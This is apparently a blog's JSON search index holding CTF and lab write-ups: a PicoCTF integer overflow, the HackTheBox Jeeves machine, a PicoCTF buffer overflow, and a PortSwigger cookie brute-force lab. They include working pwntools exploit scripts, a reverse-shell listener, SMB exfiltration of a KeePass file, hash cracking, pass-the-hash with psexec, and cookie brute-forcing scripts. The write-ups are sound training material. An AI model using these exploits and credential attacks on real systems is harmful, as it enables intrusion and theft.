
{
    
    
    
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
        
        
        
    
    "pages": [{"date":"2024-11-20","image":"","imageAlt":"","link":"https://ep1cac.github.io/posts/flag_shop/","summary":"\u003ch3 id=\"description\"\u003eDescription\u003c/h3\u003e\n\u003cp\u003eflag_shop is a challenge on PicoCTF where an integer overflow vulnerability allows for the purchase of an 1337 flag where we otherwise would have insufficient funds.\u003c/p\u003e","tags":["Code Review","Integer Overflow","PicoCTF"],"text":"description flag_shop is a challenge on picoctf where an integer overflow vulnerability allows for the purchase of an 1337 flag where we otherwise would have insufficient funds.\nwalkthrough functionality testing connecting to the pico server, we get a menu with several options.\n┌──(kali㉿kali)-[/tmp] └─$ nc jupiter.challenges.picoctf.org 9745 welcome to the flag exchange we sell flags 1. check account balance 2. buy flags 3. exit enter a menu selection we can see our account balance.\nenter a menu selection 1 balance: 1100 we can also buy flags, of which there are two options. options 1 costs 900 each, whereas option 2, the \u0026ldquo;1337 flag\u0026rdquo;, costs 100000 each.\nenter a menu selection 2 currently for sale 1. defintely not the flag flag 2. 1337 flag 1 these knockoff flags cost 900 each, enter desired quantity 2 currently for sale 1. defintely not the flag flag 2. 1337 flag 2 1337 flags cost 100000 dollars, and we only have 1 in stock enter 1 to buy one we are asked to buy a flag, presumably the 1337 flag, so let\u0026rsquo;s get started.\ncode review the first thing that caught my eye was the usage the unsecure scanf(). scanf() takes data from standard input and stores it to the address of a variable. however, it does not set a limit on the size of user input, meaning it is vulnerable to overflow. for this challenge, i did not need to exploit scanf(), but it is still a vulnerability worth keeping in mind.\nwe also see that the store.c uses an integer to store the total cost of the flags in total_cost, meaning it can be interpreted as positive or negative. total_cost is derived by multiplying the cost of flag 1 (900) with the number of flags our user wants to buy, so the number of flags we buy could flip the most significant bit of total_cost to 1, turning it into a negative number.\nif(auction_choice == 1){ printf(\u0026#34;these knockoff flags cost 900 each, enter desired quantity\\n\u0026#34;); int number_flags = 0; fflush(stdin); scanf(\u0026#34;%d\u0026#34;, \u0026amp;number_flags); if(number_flags \u0026gt; 0){ int total_cost = 0; total_cost = 900*number_flags; printf(\u0026#34;\\nthe final cost is: %d\\n\u0026#34;, total_cost); if(total_cost \u0026lt;= account_balance){ account_balance = account_balance - total_cost; printf(\u0026#34;\\nyour current balance after transaction: %d\\n\\n\u0026#34;, account_balance); } else{ printf(\u0026#34;not enough funds to complete purchase\\n\u0026#34;); } } } exploitation in two\u0026rsquo;s complement, the most significant bit, or leftmost digit determines whether a number is positive (0) or negative (1). when our total cost ends up being greater than the maximum positive integer, the cost becomes negative if the most significant bit is 1. since the price of a flag is 900, we can overflow our cost by buying maximum_integer/price_per_flag flags. of course, this value needs to be rounded up (or +1 if the quotient is a whole number).\n┌──(kali㉿kali)-[/tmp] └─$ python3 python 3.12.6 (main, sep 7 2024, 14:20:15) [gcc 14.2.0] on linux type \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information. \u0026gt;\u0026gt;\u0026gt; import math \u0026gt;\u0026gt;\u0026gt; math.ceil(2147483647/900) 2386093 \u0026gt;\u0026gt;\u0026gt; 2147483647/900 2386092.941111111 however, when i try to buy 2386093 flags, i am thrown deep into debt!\nthese knockoff flags cost 900 each, enter desired quantity 2386093 the final cost is: -2147483596 your current balance after transaction: -2147482600 let us figure out why this is happening. i\u0026rsquo;ve provided a script below to find the binary representation of an integer.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;strings.h\u0026gt; void getbin(int); int main(int argc, char* argv[]) { if (argc != 2) { printf(\u0026#34;usage: %s \u0026lt;num\u0026gt;\u0026#34;, argv[0]); exit(1); } getbin(atoi(argv[1])); return 0; } void getbin(int num) { char bin[33]; unsigned short index = 0; bin[index] = (num \u0026gt;\u0026gt; 31 \u0026amp; 1) + 48; for (int i = 1 \u0026lt;\u0026lt; 30; i \u0026gt; 0; i \u0026gt;\u0026gt;= 1) { index++; num \u0026amp; i ? (bin[index] = \u0026#39;1\u0026#39;) : (bin[index] = \u0026#39;0\u0026#39;); } bin[32] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;number: %d\\n\u0026#34;, num); printf(\u0026#34;binary: %s\\n\u0026#34;, bin); return; } calculating our expense, we get a positive number.\n┌──(kali㉿kali)-[/tmp] └─$ ./int2bin $(( 0-2386093*900 )) number: 2147483596 binary: 01111111111111111111111111001100 however, we start with 1100 in our balance, not 0. if we recalculate our balance with that accounted for, we get a negative number.\n┌──(kali㉿kali)-[/tmp] └─$ ./int2bin $(( 1100-2386093*900 )) number: -2147482600 binary: 10000000000000000000010000011000 the easiest way to fix our debacle would be to add 1100/900 when calculating the number of flags we need to buy since we will need to overflow an additional 1100 for flags that cost 900 each.\n\u0026gt;\u0026gt;\u0026gt; math.ceil(2147483647/900+1100/900) 2386095 and now we have a large, positive amount of money after the transaction\u0026hellip;\nthese knockoff flags cost 900 each, enter desired quantity 2386095 the final cost is: -2147481796 your current balance after transaction: 2147482896 \u0026hellip;and buy the 1337 flag.\ncurrently for sale 1. defintely not the flag flag 2. 1337 flag 2 1337 flags cost 100000 dollars, and we only have 1 in stock enter 1 to buy one1 your flag is: picoctf{m0n3y_\u0026lt;redacted\u0026gt;} welcome to the flag exchange we sell flags ","title":"PicoCTF: flag_shop"},{"date":"2024-11-11","image":"","imageAlt":"","link":"https://ep1cac.github.io/posts/jeeves/","summary":"\u003cp\u003e\u003cimg src=\"/img/jeeves/jeeves.png#center\" alt=\"Jeeves\"\u003e\u003c/p\u003e\n\u003ch3 id=\"description\"\u003eDescription\u003c/h3\u003e\n\u003cp\u003eJeeves is a medium-difficult machine on HackTheBox. There is a Jenkins dashboard where unauthenticated users can access the Script Console and get a reverse shell. After the initial foothold, gaining access to a KeePass database file reveals Administrator\u0026rsquo;s NTLM hash.\u003c/p\u003e","tags":["Broken Access Control","Broken Authentication","HTB","Jenkins","KeePass","Windows"],"text":"\ndescription jeeves is a medium-difficult machine on hackthebox. there is a jenkins dashboard where unauthenticated users can access the script console and get a reverse shell. after the initial foothold, gaining access to a keepass database file reveals administrator\u0026rsquo;s ntlm hash.\nrecon starting off with a nmap scan:\n# nmap 7.94svn scan initiated mon nov 11 13:02:01 2024 as: nmap -p- -a -v -t4 -on /tmp/nmap.scan 10.10.10.63 adjust_timeouts2: packet supposedly had rtt of -211723 microseconds. ignoring time. adjust_timeouts2: packet supposedly had rtt of -211723 microseconds. ignoring time. nmap scan report for 10.10.10.63 host is up (0.043s latency). not shown: 65531 filtered tcp ports (no-response) port state service version 80/tcp open http microsoft iis httpd 10.0 | http-methods: | supported methods: options trace get head post |_ potentially risky methods: trace |_http-server-header: microsoft-iis/10.0 |_http-title: ask jeeves 135/tcp open msrpc microsoft windows rpc 445/tcp open microsoft-ds microsoft windows 7 - 10 microsoft-ds (workgroup: workgroup) 50000/tcp open http jetty 9.4.z-snapshot |_http-server-header: jetty(9.4.z-snapshot) |_http-title: error 404 not found warning: osscan results may be unreliable because we could not find at least 1 open and 1 closed port device type: general purpose running (just guessing): microsoft windows 2008 (87%) os cpe: cpe:/o:microsoft:windows_server_2008:r2 aggressive os guesses: microsoft windows server 2008 r2 (87%) no exact os matches for host (test conditions non-ideal). uptime guess: 0.007 days (since mon nov 11 12:55:57 2024) network distance: 2 hops tcp sequence prediction: difficulty=260 (good luck!) ip id sequence generation: busy server or unknown class service info: host: jeeves; os: windows; cpe: cpe:/o:microsoft:windows host script results: | smb2-time: | date: 2024-11-12t00:05:55 |_ start_date: 2024-11-11t23:57:06 | smb2-security-mode: | 3:1:1: |_ message signing enabled but not required |_clock-skew: mean: 5h00m56s, deviation: 0s, median: 5h00m56s | smb-security-mode: | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) traceroute (using port 445/tcp) hop rtt address 1 43.96 ms 10.10.14.1 2 45.71 ms 10.10.10.63 read data files from: /usr/bin/../share/nmap os and service detection performed. please report any incorrect results at https://nmap.org/submit/ . # nmap done at mon nov 11 13:05:35 2024 -- 1 ip address (1 host up) scanned in 214.46 seconds i found several services, including smb, rpc, and two http servers on ports 80 and 50000. enumerating the web server on port 80 and smb do not reveal anything interesting. i was able to use rpc to find some endpoints, but i did not see anyway i could exploit jeeves with the information.\n┌──(kali㉿kali)-[~] └─$ impacket-rpcdump -p 135 10.10.10.63 impacket v0.12.0.dev1 - copyright 2023 fortra [*] retrieving endpoint list from 10.10.10.63 protocol: [ms-rsp]: remote shutdown protocol provider: wininit.exe uuid : d95afe70-a6d5-4259-822e-2c84da1ddb0d v1.0 bindings: ncacn_ip_tcp:10.10.10.63[49664] ncalrpc:[windowsshutdown] ncacn_np:\\\\jeeves[\\pipe\\initshutdown] ncalrpc:[wmsgkrpc097380] protocol: n/a provider: winlogon.exe uuid : 76f226c3-ec14-4325-8a99-6a46348418af v1.0 bindings: ncalrpc:[windowsshutdown] ncacn_np:\\\\jeeves[\\pipe\\initshutdown] ncalrpc:[wmsgkrpc097380] ncalrpc:[wmsgkrpc097a31] protocol: n/a provider: n/a uuid : 9b008953-f195-4bf9-bde0-4471971e58ed v1.0 bindings: ncalrpc:[lrpc-f01d6a34deb1026cb0] ncalrpc:[dabrpc] ncalrpc:[csebpub] ncalrpc:[lrpc-f24b240fdec2bc8c52] ncalrpc:[lrpc-bb6163cae863dbd5f9] ncalrpc:[lrpc-82dd959ab6b7e8366d] ncacn_np:\\\\jeeves[\\pipe\\lsm_api_service] ncalrpc:[lsmapi] ncalrpc:[lrpc-300bf2e2daeee2de9a] ncalrpc:[actkernel] ncalrpc:[umpo] ... however, i did find an interesting directory on the port 50000 website.\n┌──(kali㉿kali)-[~] └─$ feroxbuster -u http://10.10.10.63:50000 -w /usr/share/seclists/discovery/web-content/raft-large-words.txt -t 50 -c 404 -n ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by ben \u0026#34;epi\u0026#34; risher 🤓 ver: 2.11.0 ───────────────────────────┬────────────────────── 🎯 target url │ http://10.10.10.63:50000 🚀 threads │ 50 📖 wordlist │ /usr/share/seclists/discovery/web-content/raft-large-words.txt 💢 status code filters │ [404] 💥 timeout (secs) │ 7 🦡 user-agent │ feroxbuster/2.11.0 💉 config file │ /etc/feroxbuster/ferox-config.toml 🔎 extract links │ true 🏁 http methods │ [get] 🚫 do not recurse │ true ───────────────────────────┴────────────────────── 🏁 press [enter] to use the scan management menu™ ────────────────────────────────────────────────── 404 get 11l 26w -c auto-filtering found 404-like response and created new filter; toggle off with --dont-filter 302 get 0l 0w 0c http://10.10.10.63:50000/askjeeves =\u0026gt; http://10.10.10.63:50000/askjeeves/ [####################] - 2m 119601/119601 0s found:1 errors:0 [####################] - 2m 119601/119601 1048/s http://10.10.10.63:50000/ we find a jenkins dashboard.\njenkins is an open source ci/cd server. in this case, anonymous users have full access to the dashboard. this happens when the jenkins authorization strategy is set to unsecured. after compromising the machine, i confirmed this was the case by checking config.xml and finding the unsecured authorization strategy in use.\n\u0026lt;authorizationstrategy class=\u0026quot;hudson.security.authorizationstrategy$unsecured\u0026quot;/\u0026gt;\nfoothold we can leverage our permissions to access the script console by going to \u0026ldquo;mange jenkins\u0026rdquo; \u0026gt; \u0026ldquo;script console\u0026rdquo;.\nhere we can execute a groovy code to get a reverse shell. i got mine from revshells, but it is worth noting that java shells also work because groovy is a superset of java and also runs on the jvm.\n┌──(kali㉿kali)-[/tmp] └─$ rlwrap nc -nvlp 8000 listening on [any] 8000 ... connect to [10.10.14.31] from (unknown) [10.10.10.63] 49681 microsoft windows [version 10.0.10586] (c) 2015 microsoft corporation. all rights reserved. c:\\users\\administrator\\.jenkins\u0026gt; privilege escalation i always go for low-hanging fruit first when escalating privileges. looking at my user privilege, i saw that we have the seimpersonateprivilege. we can potentially impersonate a high-privileged user.\nc:\\temp\u0026gt;whoami /priv whoami /priv privileges information ---------------------- privilege name description state ============================= ========================================= ======== seshutdownprivilege shut down the system disabled sechangenotifyprivilege bypass traverse checking enabled seundockprivilege remove computer from docking station disabled seimpersonateprivilege impersonate a client after authentication enabled secreateglobalprivilege create global objects enabled seincreaseworkingsetprivilege increase a process working set disabled setimezoneprivilege change the time zone disabled unfortunately, this turns out to be a false lead. we\u0026rsquo;ll have to look for other privesc vectors.\nc:\\temp\u0026gt;.\\godpotato-net4.exe -cmd \u0026#34;cmd /c whoami\u0026#34; .\\godpotato-net4.exe -cmd \u0026#34;cmd /c whoami\u0026#34; [*] combasemodule: 0x140717164658688 [*] dispatchtable: 0x140717166622152 [*] useprotseqfunction: 0x140717166124880 [*] useprotseqfunctionparamcount: 5 [*] hookrpc [*] start pipeserver [*] createnamedpipe \\\\.\\pipe\\5511e14b-e9ab-43f3-b5d0-bbfe8b6571cb\\pipe\\epmapper [*] trigger rpcss [*] dcom obj guid: 00000000-0000-0000-c000-000000000046 [*] dcom obj ipid: 00003c02-0f34-ffff-9033-ef4aa84d1797 [*] dcom obj oxid: 0xb7f5e435d7866f08 [*] dcom obj oid: 0x59d6cba54f6519d9 [*] dcom obj flags: 0x281 [*] dcom obj publicrefs: 0x0 [*] marshal object bytes len: 100 [*] unmarshal object [*] unmarshalobject: 0x80070776 [!] failed to impersonate security context token eventually, i come across a keepass database file.\nc:\\\u0026gt;dir /s /b *.kdbx dir /s /b *.kdbx c:\\users\\kohsuke\\documents\\ceh.kdbx keepass files are password-protected and i don\u0026rsquo;t have the utilities to crack the password on jeeves, so i set up a smb share to exfiltrate the file to my attacker machine.\n┌──(kali㉿kali)-[/tmp] └─$ impacket-smbserver transfer /tmp/transfer -smb2support impacket v0.12.0.dev1 - copyright 2023 fortra [*] config file parsed [*] callback added for uuid 4b324fc8-1670-01d3-1278-5a47bf6ee188 v:3.0 [*] callback added for uuid 6bffd098-a112-3610-9833-46c3f87e345a v:1.0 [*] config file parsed [*] config file parsed [*] config file parsed now to mount the share and transfer ceh.kdbx.\nc:\\users\\kohsuke\\documents\u0026gt;net use m: \\\\10.10.14.31\\transfer net use m: \\\\10.10.14.31\\transfer the command completed successfully. c:\\users\\kohsuke\\documents\u0026gt;copy ceh.kdbx m: copy ceh.kdbx m: 1 file(s) copied. next we can extract the keepass password hash and crack it.\n┌──(kali㉿kali)-[/tmp/transfer] └─$ keepass2john ceh.kdbx ceh:$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48 ┌──(kali㉿kali)-[/tmp/transfer] └─$ hashcat -a 0 \u0026#39;$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48\u0026#39; /usr/share/wordlists/rockyou.txt -m 13400 we get the password moonshine1. we can now view the contents of ceh.kdbx.\nkpcli:/\u0026gt; ls === groups === ceh/ kpcli:/\u0026gt; cd ceh kpcli:/ceh\u0026gt; ls === groups === email/ general/ homebanking/ internet/ network/ windows/ === entries === 0. backup stuff 1. bank of america www.bankofamerica.com 2. dc recovery pw 3. ec-council www.eccouncil.org/programs/cer 4. it\u0026#39;s a secret localhost:8180/secret.jsp 5. jenkins admin localhost:8080 6. keys to the kingdom 7. walmart.com www.walmart.com kpcli:/ceh\u0026gt; inside the ceh group, we find some entries and more groups. further enumeartion reveals that the other groups are empty, so we can focus our efforts on the entries.\nkpcli:/ceh\u0026gt; ls * === entries === 0. backup stuff 1. bank of america www.bankofamerica.com 2. dc recovery pw 3. ec-council www.eccouncil.org/programs/cer 4. it\u0026#39;s a secret localhost:8180/secret.jsp 5. jenkins admin localhost:8080 6. keys to the kingdom 7. walmart.com www.walmart.com /ceh/email: /ceh/general: /ceh/homebanking: /ceh/internet: /ceh/network: /ceh/windows: there are usernames and password hashes in the entries. i created a user wordlist as well as a password wordlist and sprayed them against jeeves. in retrospect, this was not necessary since most of these users do not exist on the machine, so i could\u0026rsquo;ve narrowed down my users to administrator.\nkpcli:/ceh\u0026gt; show -f 0 title: backup stuff uname: ? pass: aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 url: notes: kpcli:/ceh\u0026gt; show -f 1 title: bank of america uname: michael321 pass: 12345 url: https://www.bankofamerica.com notes: kpcli:/ceh\u0026gt; show -f 2 title: dc recovery pw uname: administrator pass: s1tjatjhksugh9oc4vzl url: notes: kpcli:/ceh\u0026gt; show -f 3 title: ec-council uname: hackerman123 pass: pwndyouall! url: https://www.eccouncil.org/programs/certified-ethical-hacker-ceh notes: personal login kpcli:/ceh\u0026gt; show -f 4 title: it\u0026#39;s a secret uname: admin pass: f7whtrsfdkb6sxhu1cun url: http://localhost:8180/secret.jsp notes: kpcli:/ceh\u0026gt; show -f 5 title: jenkins admin uname: admin pass: url: http://localhost:8080 notes: we don\u0026#39;t even need creds! unhackable! kpcli:/ceh\u0026gt; show -f 6 title: keys to the kingdom uname: bob pass: lceunypjnfiupzszoysa url: notes: kpcli:/ceh\u0026gt; show -f 7 title: walmart.com uname: anonymous pass: password url: http://www.walmart.com notes: getting my shopping on none of the passwords worked, so i tried a pass-the-hash attack using the hash in entry 0 and gained access to the administrator account.\nand with that, jeeves is owned.\n┌──(kali㉿kali)-[/tmp] └─$ impacket-psexec administrator@10.10.10.63 -hashes \u0026#39;aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00\u0026#39; impacket v0.12.0.dev1 - copyright 2023 fortra [*] requesting shares on 10.10.10.63..... [*] found writable share admin$ [*] uploading file extswcyv.exe [*] opening svcmanager on 10.10.10.63..... [*] creating service shhj on 10.10.10.63..... [*] starting service shhj..... [!] press help for extra shell commands microsoft windows [version 10.0.10586] (c) 2015 microsoft corporation. all rights reserved. c:\\windows\\system32\u0026gt; ","title":"Jeeves"},{"date":"2024-10-09","image":"","imageAlt":"","link":"https://ep1cac.github.io/posts/pico_buff2/","summary":"\u003ch3 id=\"description\"\u003eDescription\u003c/h3\u003e\n\u003cp\u003eBuffer Overflow 2 is a binary exploitation challenge that involves overflowing a buffer to not only call the win() function, but also to successfully pass the necessary arguments to it.\u003c/p\u003e","tags":["Binary Exploitation","Buffer Overflow","Code Review","PicoCTF","Pwn","x86"],"text":"description buffer overflow 2 is a binary exploitation challenge that involves overflowing a buffer to not only call the win() function, but also to successfully pass the necessary arguments to it.\nwalkthrough after downloading the vulnerable binary and its source code, the first thing i did was to view the source code.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #define bufsize 100 #define flagsize 64 void win(unsigned int arg1, unsigned int arg2) { char buf[flagsize]; file *f = fopen(\u0026#34;flag.txt\u0026#34;,\u0026#34;r\u0026#34;); if (f == null) { printf(\u0026#34;%s %s\u0026#34;, \u0026#34;please create \u0026#39;flag.txt\u0026#39; in this directory with your\u0026#34;, \u0026#34;own debugging flag.\\n\u0026#34;); exit(0); } fgets(buf,flagsize,f); if (arg1 != 0xcafef00d) return; if (arg2 != 0xf00df00d) return; printf(buf); } void vuln(){ char buf[bufsize]; gets(buf); puts(buf); } int main(int argc, char **argv){ setvbuf(stdout, null, _ionbf, 0); gid_t gid = getegid(); setresgid(gid, gid, gid); puts(\u0026#34;please enter your string: \u0026#34;); vuln(); return 0; } it is apparent that the binary is using the vulnerable gets() function with a buffer size of 100 bytes. we will need to overflow the buffer and call win() as well as pass in two arguments, 0xcafef00d and 0xf00df00d, in order to complete this challenge.\nwe can also see that we need a dummy flag in order for the program to execute correctly.\n┌──(kali㉿kali)-[~/writeups/pico/buff2] └─$ echo \u0026#39;pico{debug}\u0026#39; \u0026gt; flag.txt to overflow the buffer, we first need to find the offset of the eip register. eip stands for \u0026ldquo;extended instruction pointer\u0026rdquo; and as its name suggests, points to the next instruction to be executed. we want to write the address of win() to it. to find the address, we can analyze vuln in gdb\u0026hellip;\n┌──(kali㉿kali)-[~/writeups/pico/buff2] └─$ gdb vuln \u0026hellip; and find the buffer allocation.\nnotice that the address of offset ebp-0x6c is pushed onto the stack and is read by gets(). this means that after calling the gets function, there will be 108 (0x6c) bytes of buffer between the start of the buffer and the ebp register. note that the 108 bytes allocated differ from the 100-byte buffer declared in vuln.c. discrepancies like this are usually caused by padding or local variables.\nhigh address \u0026hellip; eip (4 bytes) ebp (4 bytes) buffer + padding (108 bytes) \u0026hellip; low address eip is at a higher address immediately after ebp. since ebp is a 4 byte register, eip is 112 (108 + 4) bytes from the start of the buffer. we will therefore need 112 bytes of padding in our payload before eip starts being overwritten.\npreliminary payload: 112 bytes padding + address of win().\n#!/usr/bin/python3 from pwn import * p = process(\u0026#34;./vuln\u0026#34;) elf = elf(\u0026#34;./vuln\u0026#34;) buffer_size = 112 padding = buffer_size * b\u0026#39;a\u0026#39; addr_main = p32(elf.symbols[\u0026#34;main\u0026#34;]) payload_list = [ padding, addr_win ] payload = b\u0026#39;\u0026#39;.join(payload_list) p.sendline(payload) p.interactive() i didn\u0026rsquo;t get a clear indication as to whether my payload succeeded, so i added a breakpoint at the win() function through gdb. if win() is called, the program will pause at the breakpoint.\n#!/usr/bin/python3 from pwn import * p = process(\u0026#34;./vuln\u0026#34;) elf = elf(\u0026#34;./vuln\u0026#34;) buffer_size = 112 padding = buffer_size * b\u0026#39;a\u0026#39; addr_win = p32(elf.symbols[\u0026#34;win\u0026#34;]) payload_list = [ padding, addr_win ] payload = b\u0026#39;\u0026#39;.join(payload_list) with open(\u0026#34;payload\u0026#34;, \u0026#34;wb\u0026#34;) as f: f.write(payload) g = gdb.attach(p, gdbscript = \u0026#39;\u0026#39;\u0026#39; b *win r \u0026lt; payload \u0026#39;\u0026#39;\u0026#39;) p.sendline(payload) p.interactive() we do break, meaning our exploit successfully called win(). now, we need to add the arguments 0xcafef00d and 0xf00df00d. let us take a look at the stack frame for win().\nhigh address \u0026hellip; arg2 (4 bytes) arg1 (4 bytes) eip (4 bytes) ebp (4 bytes) \u0026hellip; low address unlike x64 binaries, all function arguments in x86 programs are passed directly onto the stack. after jumping to win(), we will also need to overflow eip before we can pass in arg1 and arg2. in my exploit script i set eip to be overflowed with the address of main() for the sake of having a valid return address, but any 4 byte value should work since the flag is being printed directly in win().\n#!/usr/bin/python3 from pwn import * p = process(\u0026#34;./vuln\u0026#34;) elf = elf(\u0026#34;./vuln\u0026#34;) buffer_size = 112 padding = buffer_size * b\u0026#39;a\u0026#39; addr_win = p32(elf.symbols[\u0026#34;win\u0026#34;]) addr_main = p32(elf.symbols[\u0026#34;main\u0026#34;]) arg1 = p32(0xcafef00d) arg2 = p32(0xf00df00d) payload_list = [ padding, addr_win, addr_main, arg1, arg2 ] payload = b\u0026#39;\u0026#39;.join(payload_list) p.sendline(payload) p.interactive() our exploit was successful. now all that\u0026rsquo;s left to do is to change the target from the local binary to the remote pico server.\n#!/usr/bin/python3 from pwn import * p = remote(\u0026#34;saturn.picoctf.net\u0026#34;, 54042) # changed from binary to pico server. elf = elf(\u0026#34;./vuln\u0026#34;) buffer_size = 112 padding = buffer_size * b\u0026#39;a\u0026#39; addr_win = p32(elf.symbols[\u0026#34;win\u0026#34;]) addr_main = p32(elf.symbols[\u0026#34;main\u0026#34;]) arg1 = p32(0xcafef00d) arg2 = p32(0xf00df00d) payload_list = [ padding, addr_win, addr_main, arg1, arg2 ] payload = b\u0026#39;\u0026#39;.join(payload_list) p.sendline(payload) p.interactive() ","title":"PicoCTF: Buffer Overflow 2"},{"date":"2024-09-23","image":"","imageAlt":"","link":"https://ep1cac.github.io/posts/cookie_brute/","summary":"\u003ch3 id=\"description\"\u003eDescription\u003c/h3\u003e\n\u003cp\u003eThe \u0026ldquo;Brute-forcing a stay-logged-in cookie\u0026rdquo; lab by PortSwigger features a web application whose stay-logged-in cookies are vulnerable to attack.\u003c/p\u003e","tags":["Broken Authentication","Cookies","PortSwigger","Web Security"],"text":"description the \u0026ldquo;brute-forcing a stay-logged-in cookie\u0026rdquo; lab by portswigger features a web application whose stay-logged-in cookies are vulnerable to attack.\nwalkthrough navigate to the login page under \u0026ldquo;my account\u0026rdquo;. we will first create a stay-logged-in cookie with the user credentials given to us. make sure check \u0026ldquo;stay logged in\u0026rdquo;.\nnow we can copy the cookie to analyze. hit ctr-shift-i to open the developer tools panel and head to the \u0026ldquo;storage\u0026rdquo; section. the value for the \u0026ldquo;stay-logged-on\u0026rdquo; field is our cookie.\nthe cookie is encoded in base64. decoding it reveals that it is composed of the our username, \u0026ldquo;:\u0026rdquo;, and a hash.\n┌──(kali㉿kali)-[/tmp] └─$ echo \u0026#39;d2llbmvyojuxzgmzmgrkyzq3m2q0m2e2mdexztllymjhnmnhnzcw\u0026#39; | base64 -d wiener:51dc30ddc473d43a6011e9ebba6ca770 given that our username was used as part of the cookie, we can reasonably infer that the hash is based on a predictable value like a timestamp, password, or maybe even the username again. in this case, it\u0026rsquo;s the md5 hash of our password. we can confirm this by hashing our password using md5 and verifying it is identical to the hash in our cookie.\n┌──(kali㉿kali)-[/tmp] └─$ echo -n \u0026#39;peter\u0026#39; | md5sum | cut -d \u0026#39; \u0026#39; -f1 51dc30ddc473d43a6011e9ebba6ca770 we have now determined that the stay-logged-in cookie is username:\u0026lt;password md5 hash\u0026gt; and base64-encoded. since we have already been given a list of passwords, we can create a list of potential cookies for carlos by applying these rules. i provided a script that does this and saves the cookies into cookies.txt.\n#!/bin/bash # md5 hash -\u0026gt; user:\u0026lt;hash\u0026gt; -\u0026gt; base64 cookie while read -r line do hash=$(printf \u0026#34;$line\u0026#34; | md5sum | cut -d \u0026#39; \u0026#39; -f1) cookie=$(printf \u0026#34;carlos:$hash\u0026#34; | base64) echo \u0026#34;$cookie\u0026#34; \u0026gt;\u0026gt; cookies.txt done \u0026lt;\u0026lt;\u0026lt; $(cat pass.txt) now we can brute force the stay-logged-in cookie for carlos. logout and start burp suite. we are going to login again as wiener again, but this time we are going to intercept our web requests. forward the post request but capture the get request for your account details.\ncopy it and save it into a file. change the id query string\u0026rsquo;s value to carlos and replace the stay-logged-in cookie with fuzz. now, we can brute force the cookie.\nffuf -request request.txt -request-proto https -mode clusterbomb -w cookies.txt:fuzz -r we see a change in the webserver\u0026rsquo;s response after supplying one of the cookies.\nnow we can simply use our cookie to take over carlos. once again, we open the developer tools and head to storage \u0026gt; cookies. right click and add another item with the name as \u0026ldquo;stay-logged-in\u0026rdquo; and the value as the cookie we got.\nrefresh the page and we are now logged in as carlos.\nbeyond pwn note that finding the cookie for carlos is similar to a password dictionary attack. in this particular though, there is a ip ban for incorrect login attempts. by brute forcing the cookie instead of password, we are able to bypass the ip ban.\nalso worth mentioning is that we can also get the carlos user\u0026rsquo;s password while brute forcing his cookie.\n#!/bin/bash # md5 hash -\u0026gt; user:\u0026lt;hash\u0026gt; -\u0026gt; base64 cookie \u0026amp;\u0026amp; cookie-password map while read -r line do hash=$(printf \u0026#34;$line\u0026#34; | md5sum | cut -d \u0026#39; \u0026#39; -f1) cookie=$(printf \u0026#34;carlos:$hash\u0026#34; | base64) echo \u0026#34;$cookie\u0026#34; \u0026gt;\u0026gt; cookies.txt echo \u0026#34;$cookie: $line\u0026#34; \u0026gt;\u0026gt; map.txt done \u0026lt;\u0026lt;\u0026lt; $(cat pass.txt) once we successfully authenticate with a cookie, we can find its corresponding password through the map.\n┌──(kali㉿kali)-[/tmp] └─$ grep \u0026#39;y2fybg9zomvmnmu2nwvmyze4ogu3zgzmzdczmzvinjq2ytg1ytix\u0026#39; map.txt y2fybg9zomvmnmu2nwvmyze4ogu3zgzmzdczmzvinjq2ytg1ytix: thomas this can be useful when checking for password reuse and may help us access more services in a real engagement.\n","title":"Portswigger Lab: Brute-forcing a stay-logged-in cookie"},{"date":"2024-09-21","image":"","imageAlt":"","link":"https://ep1cac.github.io/about/","summary":"\u003cp\u003eHello and welcome to my blog! Here you will my writeups for some of the CTFs I\u0026rsquo;ve done. I\u0026rsquo;ve started with a few interesting challenges I\u0026rsquo;ve done in the past, but as time goes on, I\u0026rsquo;ll populate this site with writeups for newer CTFs as well.\u003c/p\u003e","tags":[],"text":"hello and welcome to my blog! here you will my writeups for some of the ctfs i\u0026rsquo;ve done. i\u0026rsquo;ve started with a few interesting challenges i\u0026rsquo;ve done in the past, but as time goes on, i\u0026rsquo;ll populate this site with writeups for newer ctfs as well.\nwhoami a bit about myself\u0026hellip; i\u0026rsquo;m a compsci undergrad trying to learn how to properly secure his stuff. i\u0026rsquo;m also oscp-certified and like to spend my free time learning more about security through ctfs, mostly tryhackme and hackthebox in the past, but also expanding onto other platforms like portswigger and pwned labs. if anybody has other recommendations, questions, or would like to connect, here is my linkedin. you can also find some of my projects on github.\n","title":"About"},{"date":"2024-09-17","image":"","imageAlt":"","link":"https://ep1cac.github.io/posts/enterprise/","summary":"\u003cp\u003e\u003cimg src=\"/img/enterprise/enterprise.png#center\" alt=\"Enterprise\"\u003e\u003c/p\u003e\n\u003ch3 